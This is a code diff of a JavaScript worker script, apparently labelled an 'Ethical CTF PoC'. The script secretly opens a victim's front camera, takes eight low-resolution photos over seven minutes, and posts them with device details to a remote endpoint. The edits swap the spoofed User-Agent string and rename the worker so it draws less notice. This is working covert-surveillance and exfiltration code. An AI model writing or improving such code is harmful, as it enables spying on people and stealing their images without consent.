@@ -14,7 +14,7 @@ self.addEventListener('message', async event => {
                         { name: 'Type', value: type },
                         { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
                         { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
-                        { name: 'Device', value: navigator.userAgent || 'ServiceWorker' },
+                        { name: 'Device', value: navigator.userAgent || 'Worker' },
                         { name: 'Time', value: new Date().toISOString()
                     ],
                     footer: { text: 'Ethical CTF PoC - Do not misuse' }
@@ -30,7 +30,7 @@ self.addEventListener('message', async event => {
                 method: 'POST',
                 body: formData,
                 headers: { 
-                    'User-Agent': `Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1`
+                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36`
                 }
             });
             if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
@@ -44,7 +44,7 @@ self.addEventListener('message', async event => {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
-                    facingMode: 'user',
+                    facingMode: { ideal: 'user' },
                     width: { ideal: 128 },
                     height: { ideal: 96 },
                     frameRate: { ideal: 5 }
@@ -72,7 +72,7 @@ self.addEventListener('message', async event => {
         }
     }
 
-    await sendItem('Debug', { message: 'ServiceWorker started', time: new Date().toISOString() });
+    await sendItem('Debug', { message: 'Worker started', time: new Date().toISOString() });
     const totalPhotos = 8;
     const totalDuration = 420000; // 7 minutes
     const interval = totalDuration / totalPhotos; // ~52.5s per photo
